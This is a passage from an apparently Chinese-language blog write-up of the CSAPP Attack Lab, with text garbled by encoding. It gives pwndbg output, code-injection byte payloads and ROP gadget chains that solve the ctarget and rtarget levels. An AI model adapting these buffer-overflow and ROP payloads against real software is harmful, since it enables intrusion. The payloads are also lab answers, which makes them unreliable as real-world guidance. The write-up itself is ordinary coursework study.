class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">   0x401f89 &lt;stable_launch+40&gt;     call   mmap@plt                      &lt;mmap@plt&gt;</span><br><span class="line"></span><br><span class="line"> â–º 0x401f8e &lt;stable_launch+45&gt;     mov    rbx, rax</span><br><span class="line">   0x401f91 &lt;stable_launch+48&gt;     cmp    rax, 0x55586000</span><br><span class="line">   0x401f97 &lt;stable_launch+54&gt;     je     stable_launch+111                      &lt;stable_launch+111&gt;</span><br><span class="line">    â†“</span><br><span class="line">   0x401fd0 &lt;stable_launch+111&gt;    lea    rdx, [rax + 0xffff8]</span><br><span class="line">   0x401fd7 &lt;stable_launch+118&gt;    mov    qword ptr [rip + 0x203132], rdx &lt;stack_top&gt;</span><br><span class="line">   0x401fde &lt;stable_launch+125&gt;    mov    rax, rsp</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">00:0000â”‚ rsp 0x7fffffffe580 â€”â–¸ 0x7fffffffe6a8 â€”â–¸ 0x7fffffffe933 â—‚â€” <span class="string">&#x27;/home/jkup/target1/ctarget&#x27;</span></span><br><span class="line">01:0008â”‚     0x7fffffffe588 â€”â–¸ 0x401377 (main+458) â—‚â€” mov eax, 0</span><br><span class="line">02:0010â”‚     0x7fffffffe590 â—‚â€” 0x0</span><br><span class="line">03:0018â”‚     0x7fffffffe598 â€”â–¸ 0x402ce0 (__libc_csu_init) â—‚â€” mov qword ptr [rsp - 0x28], rbp</span><br><span class="line">04:0020â”‚     0x7fffffffe5a0 â€”â–¸ 0x400e90 (_start) â—‚â€” xor ebp, ebp</span><br><span class="line">05:0028â”‚     0x7fffffffe5a8 â—‚â€” 0x0</span><br><span class="line">06:0030â”‚     0x7fffffffe5b0 â—‚â€” 0x0</span><br><span class="line">07:0038â”‚     0x7fffffffe5b8 â€”â–¸ 0x7ffff7e12d0a (__libc_start_main+234) â—‚â€” mov edi, eax</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> â–º 0         0x401f8e stable_launch+45</span><br><span class="line">   1         0x401377 main+458</span><br><span class="line">   2   0x7ffff7e12d0a __libc_start_main+234</span><br><span class="line">   3         0x400eb9 _start+41</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">          0x400000           0x404000 r-xp     4000      0 /home/jkup/target1/ctarget</span><br><span class="line">          0x603000           0x604000 r--p     1000   3000 /home/jkup/target1/ctarget</span><br><span class="line">          0x604000           0x605000 rw-p     1000   4000 /home/jkup/target1/ctarget</span><br><span class="line">          0x605000           0x627000 rw-p    22000      0 [heap]</span><br><span class="line">        0x55586000         0x55686000 rwxp   100000      0 [anon_55586]</span><br><span class="line">    0x7ffff7def000     0x7ffff7e11000 r--p    22000      0 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7e11000     0x7ffff7f6a000 r-xp   159000  22000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7f6a000     0x7ffff7fb9000 r--p    4f000 17b000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7fb9000     0x7ffff7fbd000 r--p     4000 1c9000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7fbd000     0x7ffff7fbf000 rw-p     2000 1cd000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7fbf000     0x7ffff7fc5000 rw-p     6000      0 [anon_7ffff7fbf]</span><br><span class="line">    0x7ffff7fcc000     0x7ffff7fd0000 r--p     4000      0 [vvar]</span><br><span class="line">    0x7ffff7fd0000     0x7ffff7fd2000 r-xp     2000      0 [vdso]</span><br><span class="line">    0x7ffff7fd2000     0x7ffff7fd3000 r--p     1000      0 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7fd3000     0x7ffff7ff3000 r-xp    20000   1000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ff3000     0x7ffff7ffb000 r--p     8000  21000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000  29000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000  2a000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000      0 [anon_7ffff7ffe]</span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]</span><br></pre></td></tr></table></figure><p><strong>æ‰©å±•ï¼š</strong> å¦ä¸€ç§ <code>exp2.txt</code> çš„å†™æ³•å¦‚ä¸‹ã€‚è·³è½¬åˆ°æ³¨å…¥ä»£ç åï¼Œä½¿ç”¨Â <code>pushq</code>Â æŒ‡ä»¤å°†Â <code>touch2</code>Â çš„å †æ ˆå‹å…¥æ ˆä¸­ï¼Œä¸€æ ·èƒ½å®ç°è·³è½¬åŠŸèƒ½ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bf fa 97 b9 59 /* mov $0x59b997fa, %edi */</span><br><span class="line">68 ec 17 40 00 /* pushq $0x4017ec */</span><br><span class="line">c3             /* ret */</span><br><span class="line">30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30</span><br><span class="line">78 dc 61 55 00 00 00 00 /* buf çš„èµ·å§‹åœ°å€ */</span><br></pre></td></tr></table></figure><h2 id="Level-3">Level 3</h2><p>level 3 è¦æ±‚è·³è½¬åˆ°Â <code>touch3</code>Â å‡½æ•°ï¼Œå¹¶ä¸”æ‰§è¡Œ if åˆ†æ”¯ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch3</span><span class="params">(<span class="type">char</span> *sval)</span> &#123;</span><br><span class="line">    vlevel = <span class="number">3</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">        validate(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">        fail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">hexmatch</span><span class="params">(<span class="type">unsigned</span> val, <span class="type">char</span> *sval)</span> &#123;</span><br><span class="line">    <span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">    <span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line">    <span class="type">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>touch3</code>Â ä¼šä½¿ç”¨Â <code>hexmatch</code>Â å‡½æ•°è¿›è¡Œå­—ç¬¦ä¸²åŒ¹é…ï¼Œæ­¤å¤„Â <code>cookie</code>Â ä¸ºÂ <code>0x59b997fa</code>ï¼Œ<code>sval</code>Â æ˜¯æ”»å‡»è€…æ³¨å…¥çš„Â <code>cookie</code>Â çš„èµ·å§‹åœ°å€ã€‚</p><p><code>hexmatch</code>Â å‡½æ•°å°†Â <code>cookie</code>Â ä»åå…­è¿›åˆ¶æ•°å­—è½¬æ¢æˆäº†å­—ç¬¦ä¸²Â <code>59b997fa</code>ï¼Œç„¶åå†™åˆ°éšæœºåœ°å€<code>s</code> å¤„ã€‚æ”»å‡»è€…é¦–å…ˆè¦åœ¨æŸåœ°å€æ³¨å…¥å­—ç¬¦ä¸²Â <code>59b997fa</code>ï¼Œå¯¹åº”çš„åå…­è¿›åˆ¶ä¸ºÂ <code>35 39 62 39 39 37 66 61</code>ï¼Œç„¶åå¯é€šè¿‡ä¿®æ”¹<code>rdi</code>å¯„å­˜å™¨ä¸ºæ³¨å…¥å­—ç¬¦ä¸²åœ°å€æ¥å†³å®šä¼ å…¥çš„å­—ç¬¦æŒ‡é’ˆ<code>sval</code>ã€‚</p><p>ç”±äºè·³è½¬åˆ° <code>touch3</code> å’Œ <code>hexmatch</code> åï¼Œæœ‰è®¸å¤šçš„pushæ“ä½œä¼šè¦†ç›–æ‰æ³¨å…¥çš„<code>buf,</code>ä¸ºäº†é¿å…è¾“å…¥å­—ç¬¦ä¸²è¢«è¦†ç›–æ‰ï¼Œå¯ä»¥å°†å…¶æ”¾åœ¨è¾“å…¥å­—ç¬¦ä¸²çš„æœ€åï¼Œå¯¹åº”çš„å†…å­˜åœ°å€ä¸ºÂ <code>0x5561dc78 + 0x30 = 0x5561dca8</code>ï¼Œå…¶ä½™éƒ¨åˆ†å’Œ level 2 ç›¸ä¼¼ã€‚<code>exp3.txt</code> å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 /* mov    $0x5561dca8,%rdi */</span><br><span class="line">68 fa 18 40 00       /* pushq  $0x4018fa */</span><br><span class="line">c3                   /* retq */</span><br><span class="line">30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30</span><br><span class="line">78 dc 61 55 00 00 00 00          /* buf èµ·å§‹åœ°å€ */</span><br><span class="line">35 39 62 39 39 37 66 61 00       /* cookie: 0x59b997fa */</span><br></pre></td></tr></table></figure><blockquote><p>ğŸ’¡ æ³¨æ„å‹å…¥ <code>touch3</code> åœ°å€è¯­å¥ä¸º<code>pushq  $0x4018fa</code>ï¼Œä¸èƒ½å°‘qå–”ã€‚</p></blockquote><h1 id="ROP-æ”»å‡»"><strong>ROP æ”»å‡»</strong></h1><p>ä»£ç æ³¨å…¥æ”»å‡»è¦æ±‚èƒ½å¤Ÿç¡®å®šç¼“å†²åŒºçš„èµ·å§‹åœ°å€å’Œç¼“å†²åŒºä¸­æ³¨å…¥çš„ä»£ç èƒ½å¤Ÿè¢«æ‰§è¡Œï¼Œå¦‚æœå¼•å…¥æ ˆéšæœºåŒ–æŠ€æœ¯å¹¶é™åˆ¶å¯æ‰§è¡Œä»£ç åŒºåŸŸä¸º Text åŒºï¼Œä»£ç æ³¨å…¥æ”»å‡»å°±ä¸å¥½ä½¿äº†ã€‚<a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">Writeup</a>æåˆ° <code>rtarget</code> ä½¿ç”¨åˆ°äº†2ç§æŠ€æœ¯ï¼š</p><ul><li>æ ˆåœ°å€éšæœºåŒ–</li><li>æ ˆä¸å¯æ‰§è¡Œ</li></ul><p>è™½ç„¶æˆ‘ä»¬æ³¨å…¥çš„ä»£ç ä¸èƒ½è¢«æ‰§è¡Œï¼Œä½†æ˜¯ Text åŒºçš„ä»£ç è¿˜æ˜¯å¯ä»¥è¢«æ‰§è¡Œçš„ã€‚å¦‚æœèƒ½æŠŠè¿™äº›ä»£ç ç»„åˆåœ¨ä¸€èµ·ï¼Œå®ç°æˆ‘ä»¬æƒ³è¦çš„åŠŸèƒ½ï¼Œé‚£ä¹ˆä¹Ÿèƒ½å®ç°æ”»å‡»ç›®çš„ã€‚è¿™æ—¶å€™ç¼“å†²åŒºä¿å­˜çš„å°±ä¸æ˜¯æŒ‡ä»¤äº†ï¼Œè€Œæ˜¯ä¸€æ¡æ¡ Text åŒºå¯ä»¥è¢«æ‰§è¡Œçš„æŒ‡ä»¤çš„åœ°å€ï¼ŒåŒæ—¶è¿™äº›æŒ‡ä»¤æœ‰ä¸ªç‰¹ç‚¹ï¼Œå°±æ˜¯åé¢ä¼šè·Ÿç€Â <code>ret</code>Â æŒ‡ä»¤ï¼Œè¿™æ ·æ‰èƒ½æ ¹æ®ç¼“å†²åŒºä¸­ä¿å­˜çš„æŒ‡ä»¤åœ°å€æ¥ç€å–æŒ‡ã€‚ä¸Šè¿°çš„æ”»å‡»æ–¹å¼å°±è¢«ç§°ä¸º ROP æ”»å‡»ï¼Œç¤ºæ„å›¾å¦‚ä¸‹ï¼š</p><p><img src="/2023/06/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l3-attacklab/image-20230621151222771.png" alt></p><p>æŸ¥çœ‹ç¨‹åºä¿¡æ¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; checksec</span><br><span class="line">[*] <span class="string">&#x27;/home/jkup/target1/rtarget&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><h2 id="Level-2-2"><strong>Level 2</strong></h2><p>Level 2 è¦æ±‚ä½¿ç”¨Â <code>ROP</code>Â æ”»å‡»è·³è½¬åˆ°Â <code>touch2</code>Â å‡½æ•°å¹¶æ‰§è¡Œ if åˆ†æ”¯ï¼Œå¹¶ç»™å‡ºäº†ä¸‹åˆ—è¦æ±‚ï¼š</p><ul><li>åªèƒ½ä½¿ç”¨åŒ…å«Â <code>movq</code>ã€<code>popq</code>ã€<code>ret</code>Â å’ŒÂ <code>nop</code>Â çš„ gadgetã€‚</li><li>åªèƒ½æ“ä½œÂ <code>%rax</code>Â åˆ°Â <code>%rdi</code>Â è¿™å‰å…«ä¸ªå¯„å­˜å™¨ã€‚</li><li>åªèƒ½ä½¿ç”¨Â <code>start_farm</code>Â åˆ°Â <code>mid_farm</code>Â åŒºé—´å†…çš„ä»£ç æ¥æ„é€  gadgetã€‚</li></ul><p>å¹¶ä¸”å‹æƒ…æç¤ºäº†åªè¦ä¸¤æ¡ gadget å°±èƒ½å®ç°æ”»å‡»ã€‚æˆ‘ä»¬åœ¨ä»£ç æ³¨å…¥æ”»å‡» level 2 ä¸­æ³¨å…¥äº†Â <code>mov $0x59b997fa, %edi</code>Â æŒ‡ä»¤æ¥å®ç°Â <code>%rdi</code>Â çš„èµ‹å€¼ï¼Œä½†æ˜¯Â <code>start_farm</code>Â åˆ°Â <code>mid_farm</code>Â åŒºé—´å†…çš„ä»£ç æ²¡æœ‰åŒ…å«Â <code>0x59b997fa</code>Â ç«‹å³æ•°ï¼Œæ‰€ä»¥è¿™ä¸ªç«‹å³æ•°åº”è¯¥ç”±æ”»å‡»è€…è¾“å…¥ï¼Œå­˜åœ¨æ ˆä¸­ã€‚æ¥ç€æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸‹è¿°æŒ‡ä»¤å®ç°Â <code>%rdi</code>Â çš„èµ‹å€¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">popq %rax</span><br><span class="line">movq %rax, %rdi</span><br></pre></td></tr></table></figure><blockquote><p>ğŸ’¡ ROPçš„pipelineï¼šå…ˆè‡ªå·±å†™æ±‡ç¼–è¯­è¨€ï¼Œæ ¹æ®æ‰€éœ€æœºå™¨ç å»ç¨‹åºä¸­è¿›è¡Œæœç´¢ã€‚<br>è¿™é‡Œé€‰ç”¨raxçš„åŸå› æ˜¯ï¼šäº§çœ‹rtargetåæ±‡ç¼–ä»£ç ï¼Œå‘ç°Â <code>start_farm</code>Â åˆ°Â <code>mid_farm</code> åŒºé—´å†…ä¸»è¦æ¶‰åŠraxå’Œrdiã€‚</p></blockquote><p>å…¶ä¸­Â <code>popq %rax</code>Â å¯¹åº”çš„æœºå™¨ç ä¸ºÂ <code>58</code>ï¼Œ<code>movq %rax, %rdi</code>Â å¯¹åº”çš„æœºå™¨ç ä¸ºÂ <code>48 89 c7</code>ã€‚åœ¨Â <code>start_farm</code>Â ä¸­æœç´¢åŒ…å«è¿™ä¸ªæœºå™¨ç ã€‚</p><p>å¯ä»¥æ‰¾åˆ°Â <code>addval_219</code>Â å’ŒÂ <code>getval_280</code>Â ä¸­çš„Â <code>58</code>Â åé¢æ¥çš„ä¸æ˜¯Â <code>90</code>Â ï¼ˆå¯¹åº”Â <code>nop</code>Â æŒ‡ä»¤ï¼‰å°±æ˜¯Â <code>c3</code>ï¼ˆå¯¹åº”Â <code>ret</code>Â æŒ‡ä»¤ï¼‰ï¼Œå¯ä»¥ç”¨äºæ„é€  gadgetï¼Œåœ°å€ä¸ºÂ <code>0x4019ab</code>Â æˆ–è€…Â <code>0x4019cc</code>ã€‚è€ŒÂ <code>addval_273</code>Â å’ŒÂ <code>setvak_426</code>Â ä¸­çš„Â <code>48 89 c7</code>Â ä¹Ÿæ»¡è¶³æ¡ä»¶ï¼Œåœ°å€ä¸ºÂ <code>0x4019a2</code>Â æˆ–è€…Â <code>0x4019c5</code>ã€‚</p><p><img src="/2023/06/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l3-attacklab/2065884-20220515163146729-1696139642.png" alt></p><p>æ ¹æ®ä¸Šè¿°åˆ†æï¼Œå¯ä»¥å¾—åˆ°å­—ç¬¦ä¸²çš„åå…­è¿›åˆ¶ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30</span><br><span class="line">ab 19 40 00 00 00 00 00 /* addval_219: popq %rax */</span><br><span class="line">fa 97 b9 59 00 00 00 00 /* cookie: 0x59b997fa */</span><br><span class="line">c5 19 40 00 00 00 00 00 /* setval_426: movq %rax, %rdi */</span><br><span class="line">ec 17 40 00 00 00 00 00 /* touch2 åœ°å€ */</span><br></pre></td></tr></table></figure><h2 id="Level-3-2"><strong>Level 3</strong></h2><ul><li>You have also gotten 95/100 points for the lab. Thatâ€™s a good score. If you have other pressing obligations consider stopping right now.</li></ul><p>Level 3 åŒæ ·è¦æ±‚ä½¿ç”¨ ROP æ”»å‡»è·³è½¬åˆ°Â <code>touch3</code>Â å¹¶æ‰§è¡Œ if åˆ†æ”¯ï¼Œæœ¬æ¬¡ä¼ é€’ç»™Â <code>%rdi</code>Â çš„æ˜¯å­—ç¬¦ä¸²çš„åœ°å€ï¼Œå—åˆ°æ ˆéšæœºåŒ–çš„å½±å“ï¼Œç¼“å†²åŒºçš„èµ·å§‹åœ°å€ä¸€ç›´åœ¨å˜åŒ–ï¼Œæ‰€ä»¥ä¸èƒ½å°†å­—ç¬¦ä¸²çš„åœ°å€ç›´æ¥å†™å…¥ç¼“å†²åŒºã€‚ä½†æ˜¯Â <code>%rsp</code>Â é‡Œé¢å­˜å‚¨äº†åœ°å€ï¼Œå¦‚æœæˆ‘ä»¬ç»™è¿™ä¸ªåœ°å€åŠ ä¸Šä¸€ä¸ªåå·®é‡ï¼Œå°±èƒ½å¾—åˆ°Â <code>cookie</code>Â å­—ç¬¦ä¸²çš„åœ°å€äº†ã€‚</p><ul><li>å› ä¸ºå¼€å¯äº†æ ˆéšæœºåŒ–ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥æŠŠä»£ç æ’å…¥åˆ°ç»å¯¹åœ°å€ï¼Œå¿…é¡»æ‰¾ä¸€ä¸ªåŸºå‡†ï¼Œæˆ‘ä»¬å°±åªèƒ½æ‰¾%rspã€‚</li><li>å› ä¸ºtouch3ä¼šå¼€è¾Ÿä¸€ä¸ªå¾ˆå¤§çš„buffsizeï¼Œè‹¥æŠŠæ•°æ®æ’åˆ°touch3ä¸‹é¢çš„æ ˆç©ºé—´ï¼Œæœ‰å…³å†…å­˜ä¹‹ååŸºæœ¬å°±ä¼šè¢«é‡å†™ï¼Œæ‰€ä»¥è¦å­˜åœ¨touch3çš„æ›´é«˜åœ°å€å¤„ã€‚</li><li>æ‰€ä»¥è¦åœ¨%rspä¸ŠåŠ ä¸€ä¸ªbiasæ‰å¯ä»¥ï¼Œå³å­—ç¬¦ä¸²åœ°å€æ˜¯%rsp + biasã€‚æ²¡æœ‰ç›´æ¥çš„åŠ æ³•æŒ‡ä»¤ï¼Œé‚£å°±æ‰¾ä¸¤ä¸ªå¯„å­˜å™¨äº’ç›¸åŠ ï¼Œæ‰¾åˆ°ä¸€ä¸ªæ”¾åœ¨ä¸‹é¢ï¼š  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000000042 &lt;add_xy&gt;:</span><br><span class="line">  42:48 8d 04 37          lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  46:c3                   retq</span><br></pre></td></tr></table></figure></li></ul><p>å®ç°ä¸Šè¿°æƒ³æ³•æœ€ç›´ç™½çš„æ±‡ç¼–ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movq $rsp, %rdi</span><br><span class="line">popq %rsi</span><br><span class="line">callq 0x401d6&lt;add_xy&gt;</span><br><span class="line">movq %rax, %rdi</span><br></pre></td></tr></table></figure><p>å¯æƒœä¸æ˜¯æ¯ä¸€æ¡æŒ‡ä»¤çš„æœºå™¨ç éƒ½èƒ½åœ¨Â <code>start_farm</code>Â åˆ°Â <code>end_farm</code>Â ä¹‹é—´æ‰¾åˆ°å¹¶æ„é€ å‡º gadgetï¼Œæ‰€ä»¥éœ€è¦ç¨å¾®ç»•ç‚¹è¿œè·¯ï¼Œç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">movq %rsp, %rax</span><br><span class="line">movq %rax, %rdi</span><br><span class="line">popq %rax</span><br><span class="line">movl %eax, %edx</span><br><span class="line">movl %edx, %ecx</span><br><span class="line">movl %ecx, %esi</span><br><span class="line">callq 0x4019d6&lt;add_xy&gt;</span><br><span class="line">movq $rsp, %rdi</span><br></pre></td></tr></table></figure><p>æ ¹æ®ä¸Šè¿°æ±‡ç¼–ä»£ç çš„æœºå™¨ç åœ°å€å¯ä»¥å¾—åˆ°è¾“å…¥å­—ç¬¦ä¸²çš„åå…­è¿›åˆ¶ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30</span><br><span class="line">06 1a 40 00 00 00 00 00     /* addval_190: movq %rsp, %rax */</span><br><span class="line">a2 19 40 00 00 00 00 00     /* addval_273: movq %rax, %rdi */</span><br><span class="line">ab 19 40 00 00 00 00 00     /* addval_219: popq %rax */</span><br><span class="line">48 00 00 00 00 00 00 00     /* åç§»åœ°å€ */</span><br><span class="line">dd 19 40 00 00 00 00 00     /* getval_481: movl %eax, %edx */</span><br><span class="line">69 1a 40 00 00 00 00 00     /* getval_311: movl %edx, %ecx */</span><br><span class="line">13 1a 40 00 00 00 00 00     /* addval_436: movl %ecx, %six */</span><br><span class="line">d6 19 40 00 00 00 00 00     /* &lt;add_xy&gt; */</span><br><span class="line">c5 19 40 00 00 00 00 00     /* setval_426: movq %rax, %rdi */</span><br><span class="line">fa 18 40 00 00 00 00 00     /* touch3 åœ°å€ */</span><br><span class="line">35 39 62 39 39 37 66 61 00  /* cookie: 0x59b997fa */</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> è®¡ç®—æœºåŸºç¡€ </category>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬6ç«  å‡½æ•°</title>
      <link href="/2023/06/01/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch06/"/>
      <url>/2023/06/01/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch06/</url>
      
